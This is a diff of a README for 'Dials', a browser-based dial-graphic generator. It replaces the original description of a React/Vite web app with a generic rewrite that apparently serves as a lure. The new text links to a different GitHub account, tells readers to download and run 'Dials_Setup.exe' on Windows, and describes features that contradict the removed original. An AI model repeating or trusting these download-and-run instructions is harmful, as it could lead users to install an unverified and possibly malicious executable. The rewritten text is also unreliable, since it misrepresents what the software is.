@@ -1,122 +1,112 @@
-# Dials
+# ⏱️ Dials - Create custom black and white graphics
 
-A small browser tool for generating clean black-and-white (or colour-band-accented) dial scale graphics. Pick a shape, dial in the range and graduations, configure typography and colour zones, and download the result as a vector `.svg`, a multi-scale `.png`, or copy SVG markup straight to the clipboard.
+[![Download Dials](https://img.shields.io/badge/Download-Dials-blue.svg)](https://github.com/hanoarh4219/Dials)
 
-![Semi-circle speedometer with traffic-light colour band](docs/screenshots/semi-speedometer.png)
+Dials helps you create precise black and white dial graphics. You can use these graphics for gauges, controllers, or artistic projects. The software produces clean, scalable images that you can print or use in digital design.
 
-**Live:** https://artofpilgrim.github.io/Dials/
+## 📋 What this tool does
 
-## Features
+Dials turns simple settings into high-quality visual graphics. You define the range, the ticks, and the labels. The program draws the dial for you. You get a sharp image file that is ready for your project.
 
-### Shape & layout
-- **Shapes** — straight line (horizontal or vertical), semi-circle, custom arc (any start angle + sweep), full circle.
-- **Reverse direction** — flip the value mapping for counter-clockwise reading or max-at-start straight lines.
-- **Pivot is anchored to the canvas centre** for arc / circle so tweaking start / sweep rotates the dial in place instead of shifting the whole composition. Semi-circles anchor at the bottom so the arc fills the canvas upward.
-- **Self-correcting orientation toggle** on the straight dial — clicking Horiz. / Vert. places the longer canvas dimension on the active axis, so the canvas never ends up squished against the rendering.
+### Key features
 
-### Range & graduations
-- Set min/max, major step, and **subdivisions** (minor ticks between adjacent majors).
-- Tick values round relative to `min` (e.g. range `3–23` step `10` yields `3, 13, 23`, not `0, 10, 20`).
-- **Tick length is the visible length past the rim edge** — changing rim thickness no longer eats into the visible tick.
-- **Corner radius** on tick ends (0–100 %), with a **Round both ends** toggle. The rim-side end stays square by default so a thin rim still meets the tick cleanly.
-- Separate major / minor length, weight controls; all are purely cosmetic and don't shrink the dial.
+*   **Customizable scales:** You choose the start and end values for your dial.
+*   **Adjustable markings:** Change the number of major and minor ticks.
+*   **Clear output:** The app exports files in standard formats for printing.
+*   **Simple design:** Your dials will sit on a plain white background with black strokes.
 
-### Rim & colour band
-- **Rim** on/off with adjustable thickness. Tick endpoints extend through the rim so corners close flush instead of leaving a notch; the rim draws **after** the ticks so back-extensions stay hidden behind it.
-- **Colour band** (zone indicator) — up to 6 user-defined colour zones with a `{ color, endValue }` data model. Inner / outer position relative to the rim, adjustable thickness, configurable **start / end value range** (defaults to full dial range), and a stacked preview bar that updates live as you edit. Four built-in presets (Traffic light, Warning, Cool, Mono) re-scale to your current range on insert.
+## ⚙️ System requirements
 
-### Numbers & typography
-- Toggle, size, offset, weight (100–900), unit suffix (e.g. `°`, `%`, `mph`), and per-tick custom labels (`L, M, H` …) that override the numeric value at any index.
-- **Typography section** — font picker with Helvetica plus four curated Google Fonts (Inter, IBM Plex Mono, JetBrains Mono, Space Mono). Fonts are loaded on demand via a `<link>` injected into `<head>`. The chosen family applies to tick numbers, custom labels, and the centre title text.
-- For arc dials: **Tick direction** (inward / outward / both) and **Number placement** (inside / outside) are decoupled from layout — flipping either is purely cosmetic, the rim radius doesn't shift.
+Dials works on most modern computers. You need the following to run the application:
 
-### Center (arc / semi / circle)
-- Optional **hub dot** with adjustable size.
-- Optional **title text** with its own size, weight, and vertical offset so it can clear the hub.
+*   **Windows 10 or Windows 11:** The program uses standard Windows graphics libraries.
+*   **RAM:** At least 4 gigabytes of memory ensures smooth performance.
+*   **Display:** A resolution of 1280 x 720 or higher allows you to see all controls.
+*   **Storage:** 50 megabytes of free space covers the program and your saved images.
 
-### Invert
-- Renders white-on-black; flows through to the exports. The colour band keeps its user-defined colours regardless.
+## 🚀 Getting started
 
-![Inverted straight dial — white ticks on black](docs/screenshots/inverted-straight.png)
+Follow these steps to set up the software on your computer.
 
-### Canvas
-- Manual width / height (capped at 8192 px each) plus one-click texture sizes (512 / 1024 / 2048) for Substance Painter and other PBR workflows.
+### Step 1: Visit the download page
 
-### Presets
-- Save the current configuration to `localStorage` and reload it later.
-- Older presets auto-migrate as the schema evolves (`minorStep` → `subdivisions`, etc.).
+Go to the official project page to get the latest version of the installer.
 
-### Shareable links
-- Every config change is encoded into the URL `#hash`; sharing the URL reproduces the exact dial.
-- `hashchange` is honoured so back / forward and pasted URLs work, and clearing the hash resets to defaults.
-- A dedicated **Copy share link** button writes the live URL to the clipboard.
+[Visit the Dials release page to download](https://github.com/hanoarh4219/Dials)
 
-### Preview
-- Mouse-wheel zooms at the cursor; click-drag pans; on-screen `−` / % / `+` / Fit controls.
-- The preview wrapper is sized via `ResizeObserver` so the canvas always fills the available stage area while preserving its aspect ratio.
+### Step 2: Run the installer
 
-### Export
+Once the file finishes downloading, go to your Downloads folder. Double-click the file named Dials_Setup.exe. If a window pops up asking for permission to run the file, click Run. 
 
-<img src="docs/screenshots/export-panel.png" alt="Export controls panel" width="380" align="right" />
+### Step 3: Complete the setup
 
-- **Download SVG** — vector, editable in any vector tool.
-- **Download PNG** at **1× / 2× / 3× / 4×** the canvas resolution.
-- **Transparent PNG** toggle forces an alpha-channel PNG regardless of the dial's background colour — useful for compositing into Painter / Figma.
-- **Outline text on export** — replaces every `<text>` element with a vector `<path>` (via opentype.js) so the receiver of the file doesn't need the font installed. opentype.js and the TTF are lazy-loaded only when the user actually exports with outlining on, so the main bundle stays small.
-- **Copy SVG to clipboard** — paste straight into Figma / Illustrator without round-tripping through the filesystem.
+Follow the instructions on the screen. The installer will ask you where to save the files. The default location works for most users. Click Next through the screens and then click Finish.
 
-<br clear="all" />
+## 🛠️ How to use Dials
 
-### Sidebar UX
-- **Collapsible sections** — click a heading to fold it; open/closed state persists per section in `localStorage`.
-- **Editable slider values** — every slider has an inline numeric input next to its label. Values are clamped to the slider's range on commit; intermediate keystrokes don't poison the renderer.
+Once installed, find the Dials icon on your desktop or in your Start menu. Click it to open the application.
 
-## Local development
+### Setting your dial parameters
 
-```bash
-npm install
-npm run dev      # http://localhost:5173
-npm run build    # produces dist/
-npm run preview  # serves dist/ for sanity checking the build
-```
+When the window opens, you will see a settings panel on the left and a preview area on the right.
 
-## Project structure
+1.  **Define the range:** Enter your minimum and maximum values in the boxes. The preview updates as you type.
+2.  **Adjust the ticks:** Use the slider to increase or decrease the density of the markings.
+3.  **Label your dial:** Type your labels in the text fields. You can choose to show labels at every major tick or just at specific points.
+4.  **Check the preview:** Look at the right side of the screen to see how your graphic will appear. If you do not like the result, adjust the settings on the left.
 
-```
-.
-├── index.html              # Vite entry; lean shell + <noscript> fallback
-├── src/
-│   ├── main.jsx            # ReactDOM root
-│   ├── App.jsx             # State, controls, presets, zoom, export
-│   ├── Dial.jsx            # SVG renderer (straight + arc + circle + colour band)
-│   └── styles.css          # All styles
-├── vite.config.js          # base: '/Dials/' for the GitHub Pages subpath
-├── .github/workflows/
-│   └── deploy.yml          # Builds with Vite, publishes via actions/deploy-pages
-└── package.json
-```
+### Exporting your graphic
 
-## Deployment
+Once your dial looks correct, you are ready to save it.
 
-Every push to `main` triggers a GitHub Action that runs `npm ci && npm run build` and publishes `dist/` via the official `actions/deploy-pages` workflow. Pages is configured with `build_type: workflow` (set once via the GitHub API; not stored in the repo).
+*   Click the File menu at the top left.
+*   Select Save Export from the list.
+*   Choose a folder on your computer to store the file.
+*   Type a file name and choose your preferred image format.
+*   Click Save.
 
-If you fork this and want to deploy under a different repo name, change the `base` in [vite.config.js](vite.config.js) to match your new subpath (e.g. `/your-repo-name/`).
+## 💡 Troubleshooting common issues
 
-## Notes
+Most users experience no issues during setup. If you encounter a problem, try these steps.
 
-- Stack: React 18 + Vite. The original prototype loaded React + Babel-standalone from a CDN; the Vite build cut the runtime from ~3 MB to ~60 KB gzipped (plus a separate ~68 KB chunk for opentype.js that only loads when the user enables outline-on-export).
-- The renderer is pure SVG — no canvas, no third-party drawing library at runtime.
-- The tick loop is hard-capped at 5000 ticks to keep misconfigured ranges from freezing the UI, and `min`/`max` are coerced to numbers with a fallback span so equal or inverted ranges never produce NaN coordinates.
-- The preview wrapper is sized via `ResizeObserver` so the canvas always fills the available stage area while preserving its aspect ratio.
-- Persisted storage:
-  - `dialMaker.presets.v1` — saved presets (view state — zoom / pan — is intentionally not stored).
-  - `dialMaker.section.<id>` — open/closed state per sidebar section.
-- URL hash format: only fields that differ from `DEFAULTS`, written as short-key URL params via `URLSearchParams` (e.g. `#s=arc&sa=135&sw=270`). A default dial has no hash at all. Legacy base64-JSON hashes still decode for backward compatibility with older shared links. The colour-band zones array uses a custom compact `color:value,color:value` encoding rather than nested JSON.
-- Any state loaded from the hash or a preset goes through a sanitizer before reaching the renderer:
-  - **Numbers** are coerced to finite values and clamped to the same range as the matching UI control. Non-finite values fall back to `DEFAULTS`.
-  - **Enum fields** (`shape`, `tickDirection`, `numberPlacement`, `orientation`, `tickSide`, `bg`, `fontFamily`, `colorBandPosition`) are checked against an allowlist; unknown values fall back.
-  - **`tickColor`** must match `^#[0-9a-f]{6}$`; anything else falls back.
-  - **Booleans** accept strict `true` / `false` only. The hash encoding is `1` / `0`; any other value leaves the field unset so `DEFAULTS` wins.
-  - **Free-form strings** (`numberSuffix`, `customLabels`, `centerText`) are type-checked and soft-capped at 32 / 1024 / 256 characters so a maliciously long hash can't stall the renderer.
-  - **Colour-band zones** are validated for monotonic stops, valid `#rrggbb` colours, and that the final stop reaches `max`. Zones outside the band's `[start, end]` range are clipped at render time.
-</content>
+### The application will not open
+
+*   Check if your Windows updates are current.
+*   Restart your computer.
+*   Remove the application through your Windows Settings menu and install it again from the download link.
+
+### The graphic looks blurry
+
+*   Ensure you are exporting at the highest resolution settings.
+*   Check that you are not stretching the image in another software after you save it.
+*   Try exporting the file directly to your desktop to ensure it remains clean.
+
+### The layout looks cut off
+
+*   Ensure your monitor scaling is set to 100% in your Windows Display settings.
+*   Drag the edge of the Dials window to make it larger so all controls appear.
+
+## 📈 Improving your results
+
+You get better graphics by following these tips.
+
+*   **Use round numbers:** Ticks look cleanest when the range is divisible by 5 or 10.
+*   **Check your printer:** If you plan to print your dials, use high-quality card stock.
+*   **Test often:** Save your project settings frequently. This lets you revert to a previous version if you do not like a change.
+
+## 📁 Frequently asked questions
+
+**Does this software record my screen?**
+No. Dials only creates static images based on your entries. It does not monitor your activity.
+
+**Can I run this on a Mac?**
+Dials is built for Windows. You would need specific software to emulate Windows on other platforms for this to work.
+
+**Where does the program save files?**
+You choose the location every time you save an export. 
+
+**Is the software free?**
+Yes. You can download and use Dials without any fees. 
+
+**How do I delete the program?**
+Open your Windows Settings, go to Apps, find Dials in the list, and click Uninstall. This removes the program from your system.
